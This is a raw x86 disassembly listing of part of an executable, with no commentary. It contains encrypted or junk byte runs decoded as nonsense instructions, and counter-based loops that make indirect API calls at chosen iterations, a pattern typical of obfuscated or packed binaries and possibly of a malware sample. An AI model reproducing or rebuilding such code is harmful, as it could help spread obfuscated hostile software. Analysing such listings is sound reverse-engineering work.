  403108:	test   ebx,edx
  40310a:	(bad)  
  40310b:	pop    ss
  40310c:	sahf   
  40310d:	xchg   ch,dl
  40310f:	cmp    DWORD PTR [esi],edx
  403111:	xchg   ebp,eax
  403112:	inc    ebp
  403113:	es call 0x1f41:0xb2c26c6f
  40311b:	mov    edx,0xdcc3157d
  403120:	shl    BYTE PTR [edx-0x222d2896],0xf1
  403127:	and    ch,BYTE PTR [eax]
  403129:	xchg   DWORD PTR [eax],ebx
  40312b:	or     BYTE PTR [edx+0x4],dh
  40312e:	jno    0x40312d
  403130:	inc    esp
  403131:	fiadd  WORD PTR [edi+0x23be2a00]
  403137:	push   eax
  403138:	jne    0x40310e
  40313a:	ret    
  40313b:	cmp    edi,edi
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	rcr    DWORD PTR [ecx+0x6b],0xd3
  40315f:	pushf  
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x40310e
  403169:	shr    DWORD PTR [edi-0x17],1
  40316c:	dec    ebx
  40316d:	mov    BYTE PTR [ecx+0x32],ah
  403170:	in     al,dx
  403171:	xchg   edi,eax
  403172:	jecxz  0x40318f
  403174:	mov    ebx,0x25cd326e
  403179:	lahf   
  40317a:	mov    esp,0x5debc48f
  40317f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403180:	retf   
  403181:	into   
  403182:	sub    BYTE PTR [edi+0x1b5d0b10],al
  403188:	push   ss
  403189:	push   cs
  40318a:	adc    al,0x68
  40318c:	pop    ebp
  40318d:	jmp    0x4531:0xf6921a3d
  403194:	sub    DWORD PTR fs:[edi],esp
  403197:	cld    
  403198:	xor    ch,BYTE PTR [edi-0x4b]
  40319b:	bound  eax,QWORD PTR [ecx-0x76680747]
  4031a1:	scas   al,BYTE PTR es:[edi]
  4031a2:	push   ds
  4031a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031a4:	out    0xe6,eax
  4031a6:	cmp    edi,edi
  4031a8:	in     eax,0xb1
  4031aa:	jmp    0x1c99c9e8
  4031af:	js     0x403211
  4031b1:	or     DWORD PTR [ebp+0x5e],0x8bd315c9
  4031b8:	fcomp  DWORD PTR [ecx+0x44]
  4031bb:	lea    edi,[ebx+ebx*1+0x7c946c0d]
  4031c2:	loop   0x403167
  4031c4:	inc    edx
  4031c5:	adc    bl,bl
  4031c7:	fld    QWORD PTR [ebp+0xb]
  4031ca:	es test al,0x94
  4031cd:	bound  ecx,QWORD PTR [esi+0x5dab9139]
  4031d3:	add    ebp,DWORD PTR fs:[edx-0x5c]
  4031d7:	mov    edi,DWORD PTR [edi]
  4031d9:	imul   edx,DWORD PTR [edi],0x6dee767
  4031df:	sub    DWORD PTR [eax],eax
  4031e1:	das    
  4031e2:	arpl   WORD PTR [edx],dx
  4031e4:	scas   al,BYTE PTR es:[edi]
  4031e5:	scas   eax,DWORD PTR es:[edi]
  4031e6:	mov    ebp,0xb143fa1d
  4031eb:	gs dec ebx
  4031ed:	stos   BYTE PTR es:[edi],al
  4031ee:	push   edx
  4031ef:	cmp    eax,DWORD PTR ss:[ecx+0x2fcc33f2]
  4031f6:	jecxz  0x4031b8
  4031f8:	jge    0x4031c9
  4031fa:	mov    bh,0x31
  4031fc:	(bad)  
  4031fd:	cmp    edx,DWORD PTR [edx]
  4031ff:	push   ebx
  403200:	and    al,bh
  403202:	push   edx
  403203:	and    bl,bh
  403205:	lods   al,BYTE PTR ds:[esi]
  403206:	retf   
  403207:	sub    al,BYTE PTR [edx-0x1622ea67]
  40320d:	fs mov ch,0x5f
  403210:	jae    0x4031f8
  403212:	adc    al,0xb1
  403214:	gs fsubrp st(0),st
  403217:	js     0x403265
  403219:	mov    dl,0xe
  40321b:	hlt    
  40321c:	je     0x403242
  40321e:	inc    eax
  40321f:	mov    ?,WORD PTR [edx-0x62]
  403222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403223:	and    eax,0x4afe54ca
  403228:	fist   DWORD PTR [ecx+0x26]
  40322b:	add    dl,BYTE PTR [eax+0x68c3eba2]
  403231:	push   ecx
  403232:	xor    cl,BYTE PTR [ecx+0x5663d05f]
  403238:	in     eax,0x72
  40323a:	sbb    al,0xf1
  40323c:	aas    
  40323d:	mov    dh,0x42
  40323f:	aad    0x6c
  403241:	pop    edi
  403242:	adc    eax,0xd25d4267
  403247:	scas   eax,DWORD PTR es:[edi]
  403248:	pop    ss
  403249:	retf   0xc03b
  40324c:	ror    BYTE PTR [ebp+0x14d0d2dd],cl
  403252:	into   
  403253:	adc    BYTE PTR [eax],ch
  403255:	clc    
  403256:	jns    0x40327d
  403258:	sbb    cl,BYTE PTR [ecx+0x353a43ba]
  40325e:	daa    
  40325f:	clc    
  403260:	pop    ss
  403261:	jl     0x4031fb
  403263:	mov    esp,0x573aa3b8
  403268:	bound  esp,QWORD PTR [esi+eiz*1]
  40326b:	mov    esi,0xf9ca8f7a
  403270:	xchg   ebp,eax
  403271:	out    0x8b,eax
  403273:	out    dx,eax
  403274:	test   DWORD PTR [ebp+edi*1+0x4bff19ac],esp
  40327b:	and    al,0x90
  40327d:	jle    0x403269
  40327f:	inc    ebp
  403280:	pop    ebp
  403281:	sub    ch,BYTE PTR [ecx-0x4f]
  403284:	xor    bh,BYTE PTR [eax+0x3da6d837]
  40328a:	loope  0x4032a0
  40328c:	shl    al,1
  40328e:	push   edx
  40328f:	sub    al,0x43
  403291:	push   edi
  403292:	dec    edx
  403293:	pop    ebp
  403294:	push   ebp
  403295:	sub    eax,0x5a6f121b
  40329a:	mov    ds:0xffc12258,al
  40329f:	addr16 dec ebx
  4032a1:	jmp    0x563c:0x59aa45e5
  4032a8:	fadd   QWORD PTR [eax+0x4b]
  4032ab:	daa    
  4032ac:	cmp    eax,0xca56bb96
  4032b1:	cmp    bl,BYTE PTR [edi+0x50]
  4032b4:	adc    al,0x68
  4032b6:	cs mov bh,0xc7
  4032b9:	ins    BYTE PTR es:[edi],dx
  4032ba:	mov    bh,0xbb
  4032bc:	sbb    edi,DWORD PTR [eax+0x2c]
  4032bf:	cwde   
  4032c0:	cmp    ebp,ebx
  4032c2:	sti    
  4032c3:	add    DWORD PTR [ebx-0x36],esi
  4032c6:	stos   BYTE PTR es:[edi],al
  4032c7:	mov    ds:0x2a17ba24,eax
  4032cc:	ja     0x40325b
  4032ce:	jne    0x403257
  4032d0:	mov    eax,0xfd4a60d1
  4032d5:	sbb    BYTE PTR [esp+esi*4],ah
  4032d8:	or     BYTE PTR [ebp+eax*4+0x73ed771a],bl
  4032df:	add    al,0x48
  4032e1:	xchg   ecx,eax
  4032e2:	ss cmp cl,ch
  4032e5:	in     eax,dx
  4032e6:	fs aas 
  4032e8:	or     DWORD PTR [ecx],0x5b5ea8d7
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43375b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43375b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43375b,ecx
  40331d:	cmp    DWORD PTR ds:0x43375b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43375b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4337ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4337d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43371f
  40336b:	add    DWORD PTR ds:0x433703,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433757,0x1e
  40338b:	cmp    DWORD PTR ds:0x433757,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433757,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433757,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433757
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433757,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433757
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433757,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4337e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433747
  4033f2:	mov    edi,DWORD PTR ds:0x433787
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433767,0x1c
  40340f:	cmp    DWORD PTR ds:0x433767,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433767,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433767,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433767
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433767,edi
  40344c:	mov    edi,DWORD PTR ds:0x433767
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433767,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4337e3
  403467:	and    edx,DWORD PTR ds:0x433817
  40346d:	mov    DWORD PTR ds:0x4337e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43379b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43381f
  40349f:	adc    DWORD PTR ds:0x4336ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433817,0x10
  4034c6:	cmp    DWORD PTR ds:0x433817,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433817,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433817,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433817
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433817,edi
  403505:	mov    edi,DWORD PTR ds:0x433817
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433817,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43382b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0xd86d48a]
  403537:	and    edx,ebp
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	sahf   
  403542:	or     DWORD PTR gs:[edx],esi
  403545:	cld    
  403546:	sbb    al,0x7f
  403548:	xchg   esi,eax
  403549:	push   edi
  40354a:	push   0x5aeb58c1
  40354f:	or     ebx,DWORD PTR [edx+0x58e01c9e]
  403555:	pop    eax
  403556:	xor    DWORD PTR [edx-0x48c7cf29],ebp
  40355c:	mov    ecx,0x4df6a7cb
  403561:	and    ch,BYTE PTR [edx]
  403563:	pop    edx
  403564:	mov    al,ds:0x44693597
  403569:	or     eax,0xcbe1118a
  40356e:	push   0x49e8ca5f
  403573:	mov    al,0xbd
  403575:	retf   
  403576:	lods   eax,DWORD PTR ds:[esi]
  403577:	and    esp,ecx
  403579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40357a:	lock imul DWORD PTR [ecx]
  40357d:	lods   al,BYTE PTR ds:[esi]
  40357e:	mov    edx,0x710e9ff0
  403583:	sbb    eax,0x30738933
  403588:	clc    
  403589:	(bad)  [eax-0x57]
  40358c:	das    
  40358d:	ds and eax,0x46b97dd3
  403593:	mov    ebx,0x706aa85f
  403598:	mov    dl,0x62
  40359a:	ja     0x4035c4
  40359c:	mov    ebx,0x3d12878b
  4035a1:	inc    edx
  4035a2:	mov    ecx,0x1edf5846
  4035a7:	dec    ebp
  4035a8:	dec    ebp
  4035a9:	fadd   DWORD PTR [edx]
  4035ab:	adc    DWORD PTR [edx],eax
  4035ad:	imul   DWORD PTR [ebx]
  4035af:	push   ecx
  4035b0:	retf   
  4035b1:	adc    DWORD PTR ds:0xb6268ea2,0x25
  4035b8:	jge    0x4035f9
  4035ba:	inc    edi
  4035bb:	test   DWORD PTR [ecx+eax*2+0x20],0xbec8940f
  4035c3:	cld    
  4035c4:	push   edx
  4035c5:	fmul   st(5),st
  4035c7:	cmc    
  4035c8:	das    
  4035c9:	push   edi
  4035ca:	adc    DWORD PTR [eax-0x41a6eb8e],0x1c
  4035d1:	jmp    0x406b181a
  4035d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035d7:	push   ebp
  4035d8:	lds    ebp,FWORD PTR [ecx+0x68]
  4035db:	into   
  4035dc:	aas    
  4035dd:	daa    
  4035de:	int3   
  4035df:	sub    cl,BYTE PTR [ebp+0x4afe82a3]
  4035e5:	in     al,dx
  4035e6:	mov    eax,ebx
  4035e8:	enter  0x1111,0xeb
  4035ec:	(bad)  
  4035ed:	cdq    
  4035ee:	sub    ah,bh
  4035f0:	mov    esi,0xd6804029
  4035f5:	xchg   ebp,eax
  4035f6:	pushf  
  4035f7:	xor    al,0xa0
  4035f9:	jle    0x40363a
  4035fb:	cmp    eax,0x2d276bd6
  403600:	mov    ch,BYTE PTR [edi-0x7b]
  403603:	fisttp QWORD PTR [esp+edx*2]
  403606:	push   edx
  403607:	push   ecx
  403608:	(bad)  
  403609:	out    0xaa,al
  40360b:	pop    ebx
  40360c:	cmp    edi,DWORD PTR [ebp-0x729c9047]
  403612:	cmp    esp,DWORD PTR [eax+0x51]
  403615:	aaa    
  403616:	mov    al,ds:0x562be9eb
  40361b:	xchg   ebp,eax
  40361c:	mov    WORD PTR [ebp+eax*4-0x6c],ss
  403620:	enter  0xfe23,0x56
  403624:	push   esp
  403625:	xchg   ebx,eax
  403626:	fdivr  st,st(2)
  403628:	sbb    BYTE PTR [ebx+0x2c],bl
  40362b:	stos   BYTE PTR es:[edi],al
  40362c:	mov    ecx,0x90084357
  403631:	sub    WORD PTR [ecx],ax
  403634:	mov    eax,0x39bacb38
  403639:	fnstenv [ebp+0x18]
  40363c:	jae    0x40368a
  40363e:	clc    
  40363f:	push   es
  403640:	add    eax,0x14572b38
  403645:	jb     0x403632
  403647:	inc    esp
  403648:	jle    0x403656
  40364a:	cwde   
  40364b:	xlat   BYTE PTR ds:[ebx]
  40364c:	fistp  DWORD PTR [edx-0x39]
  40364f:	add    al,0x7e
  403651:	loope  0x4036a9
  403653:	sbb    eax,0xc821a899
  403658:	lahf   
  403659:	sbb    BYTE PTR [ecx-0x5d],ch
  40365c:	adc    al,BYTE PTR [esi-0x74783272]
  403662:	js     0x403656
  403664:	gs push eax
  403666:	push   0x1600332d
  40366b:	test   eax,0x6137f28c
  403670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403671:	mov    bl,0x5c
  403673:	retf   0xd7e0
  403676:	jae    0x40369c
  403678:	inc    esp
  403679:	out    0x37,al
  40367b:	mov    edx,0x2fd063d6
  403680:	shr    DWORD PTR [ecx],0x7e
  403683:	call   0x542f:0xd54294ab
  40368a:	mov    al,ds:0x17cb1633
  40368f:	or     esp,DWORD PTR ds:0xab9f0f3d
  403695:	popf   
  403696:	in     eax,0x49
  403698:	aaa    
  403699:	add    BYTE PTR [ebp+0x6b16ba03],bh
  40369f:	push   es
  4036a0:	jmp    0x89fb7943
  4036a5:	div    ebp
  4036a7:	cmp    DWORD PTR [edi*4-0x671aaf7e],ebx
  4036ae:	fisub  WORD PTR [esi-0x3a]
  4036b1:	fist   WORD PTR [edi+0xb]
  4036b4:	in     eax,dx
  4036b5:	iret   
  4036b6:	ins    BYTE PTR es:[edi],dx
  4036b7:	ret    0x45b
  4036ba:	push   esp
  4036bb:	mov    esp,0xbf04d8d
  4036c0:	or     DWORD PTR [ecx+0x15d56052],ecx
  4036c6:	inc    ebp
  4036c7:	sub    BYTE PTR [edi],dh
  4036c9:	js     0x403722
  4036cb:	push   0xffffffaf
  4036cd:	mov    ah,0xee
  4036cf:	fs mov edx,0x97a2a9d6
  4036d5:	dec    ecx
  4036d6:	in     al,dx
  4036d7:	test   BYTE PTR [esi+0x4f],ch
  4036da:	jo     0x403687
  4036dc:	add    eax,0x7ea1eebc
  4036e1:	push   ss
  4036e2:	xchg   esp,eax
  4036e3:	jbe    0x4036a5
  4036e5:	mov    ds:0x1afde9bf,al
  4036ea:	xor    al,0x46
  4036ec:	or     esi,DWORD PTR [edi-0x32e6dfca]
  4036f2:	rcl    DWORD PTR [ecx+eax*1+0x6d],1
  4036f6:	sub    eax,DWORD PTR [edx+0x3]
  4036f9:	mov    al,0x2
  4036fb:	aad    0x50
  4036fd:	jo     0x403698
  4036ff:	or     BYTE PTR [ebp+esi*2+0x4358d5f4],al
  403706:	push   edx
  403707:	push   ebx
  403708:	rcl    edi,1
  40370a:	sbb    bl,BYTE PTR [ecx+0x74e52b57]
  403710:	test   eax,0xc3bb8488
  403715:	xor    BYTE PTR [esp+ebx*8],al
  403718:	imul   ecx,DWORD PTR [edi+esi*1+0x47],0xefecc3b9
  403720:	fcom   st(6)
  403722:	ins    BYTE PTR es:[edi],dx
  403723:	add    DWORD PTR [ecx+0x57ab6037],ebx
  403729:	mov    ebx,0x91d5722e
  40372e:	std    
  40372f:	test   DWORD PTR [esi+0x373b1a6],ecx
  403735:	sub    al,0xf3
  403737:	xor    al,0xab
  403739:	ins    BYTE PTR es:[edi],dx
  40373a:	ret    0xdf50
  40373d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40373e:	xor    dl,BYTE PTR [edi]
  403740:	or     eax,0x78c989bd
  403745:	pop    eax
  403746:	out    dx,eax
  403747:	mov    ds:0xb0c32450,al
  40374c:	sub    ebx,DWORD PTR [edi+0x5c]
  40374f:	cmp    al,0x6
  403751:	sar    DWORD PTR [edi+0x77de386],1
  403757:	outs   dx,DWORD PTR ds:[esi]
  403758:	mov    ah,0x2f
  40375a:	mov    es,WORD PTR [ecx]
  40375c:	sbb    ecx,DWORD PTR [edi+0x1fb5ec1d]
  403762:	call   0x1471f858
  403767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403768:	fsub   QWORD PTR [ebp*8-0x27d9c312]
  40376f:	xor    BYTE PTR [ebp-0x54bc4dfe],dl
  403775:	mov    dl,0x52
  403777:	cmc    
  403778:	sub    al,0xa0
  40377a:	jge    0x4037a9
  40377c:	adc    eax,0xe7ff1c74
  403781:	cld    
  403782:	cs jns 0x40379e
  403785:	adc    DWORD PTR [esi-0x5e45ecdc],0x58
  40378c:	cmp    bl,BYTE PTR [ebp+esi*4+0x4155559b]
  403793:	push   ds
  403794:	mov    ecx,0x665c770f
  403799:	inc    edi
  40379a:	in     eax,0x95
  40379c:	nop
  40379d:	popa   
  40379e:	(bad)  
  40379f:	sbb    eax,0xb9b1f578
  4037a4:	test   al,al
  4037a6:	in     al,0x27
  4037a8:	jne    0x4037c4
  4037aa:	test   eax,0xdaa5dfdc
  4037af:	popa   
  4037b0:	mov    bl,0xff
  4037b2:	jmp    0x403746
  4037b4:	xchg   edi,eax
  4037b5:	xchg   ebp,eax
  4037b6:	mov    dh,0xf4
  4037b8:	ja     0x4037a0
  4037ba:	out    dx,al
  4037bb:	not    DWORD PTR [edi]
  4037bd:	pop    edi
  4037be:	iret   
  4037bf:	or     DWORD PTR [ebx],0xffffffa5
  4037c2:	pop    esp
  4037c3:	mov    edx,0xb95eb9b1
  4037c8:	(bad)  
  4037c9:	inc    eax
  4037ca:	xchg   edi,eax
  4037cb:	cdq    
  4037cc:	mov    cl,0xea
  4037ce:	mov    ds:0x6b6c9d1a,eax
  4037d3:	fnstcw WORD PTR [eax-0x232e8d58]
  4037d9:	imul   edx,ebp,0x21
  4037dc:	int3   
  4037dd:	mov    al,0x35
  4037df:	cmp    esi,DWORD PTR [edx-0x3062607]
  4037e5:	xchg   esp,eax
  4037e6:	pusha  
  4037e7:	dec    BYTE PTR [ebx-0x773f5ff4]
  4037ed:	fwait
  4037ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ef:	addr16 inc edi
  4037f1:	pop    eax
  4037f2:	or     al,0xd3
  4037f4:	mov    ds:0x359185b1,al
  4037f9:	xchg   esi,eax
  4037fa:	std    
  4037fb:	jae    0x403814
  4037fd:	jo     0x4037f2
  4037ff:	dec    ebp
  403800:	inc    ebx
  403801:	call   0x1f82f239
  403806:	push   ss
  403807:	in     al,0x4b
  403809:	or     esi,DWORD PTR [ecx-0x12d4f2a4]
  40380f:	push   es
  403810:	ficom  DWORD PTR [ecx-0x711504cc]
  403816:	lds    edx,FWORD PTR [esi]
  403818:	sbb    BYTE PTR [edi+0x45],ch
  40381b:	mov    esi,0xa9334d56
  403820:	cs ret 
  403822:	xchg   edi,eax
  403823:	loope  0x40388a
  403825:	xchg   BYTE PTR [esi-0x39],bh
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x36fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	aaa    
  40383b:	inc    ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43382725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433827
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433827,edi
  403858:	cmp    DWORD PTR ds:0x433827,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433827,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433827
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433827,edi
  40389c:	cmp    DWORD PTR ds:0x433827,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43376b,0x43382b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433793,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4337eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433827,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4337eb,0x4337ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4336fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433717,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433713,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43381b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4336ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4336ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4336ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4336ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4336ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4336ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4336ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4336ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433767
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433713
  4039a6:	sub    edi,DWORD PTR ds:0x433823
  4039ac:	mov    DWORD PTR ds:0x433713,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433707,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433707,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433707,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433707
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433707,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433717
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4336fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4336fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4336fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4336fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4336fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4337d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4337d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4337d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4337d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4337d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43381b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403a8e
  403acb:	push   0x3f
  403acd:	sbb    DWORD PTR [eax],esp
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403aac
